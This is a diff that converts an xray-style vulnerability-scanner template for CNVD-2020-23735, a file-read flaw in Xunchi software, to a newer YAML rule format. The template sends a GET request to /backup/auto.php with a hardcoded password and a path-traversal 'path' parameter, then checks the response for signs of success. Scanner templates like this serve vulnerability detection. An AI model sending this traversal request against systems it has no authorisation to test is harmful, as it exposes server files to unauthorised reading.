@@ -1,15 +1,20 @@
 name: poc-yaml-xunchi-cnvd-2020-23735-file-read
+manual: true
+transport: http
 rules:
-  - method: GET
-    path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
-    headers:
-      Accept-Encoding: 'deflate'
-    follow_redirects: false
-    expression: |
-      response.status == 200 && response.body.bcontains(bytes(string("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"))) && response.body.bcontains(bytes(string("display_errors")))
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php
+            headers:
+                Accept-Encoding: deflate
+            follow_redirects: false
+        expression: response.status == 200 && response.body.bcontains(bytes(string("NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"))) && response.body.bcontains(bytes(string("display_errors")))
+expression: r0()
 detail:
-  author: 清风明月(www.secbook.info)
-  influence_version: ' >= V2.3'
-  links:
-    - http://www.cnxunchi.com
-    - https://www.cnvd.org.cn/flaw/show/2025171
+    author: 清风明月(www.secbook.info)
+    links:
+        - http://www.cnxunchi.com
+        - https://www.cnvd.org.cn/flaw/show/2025171
+    influence_version: ' >= V2.3'
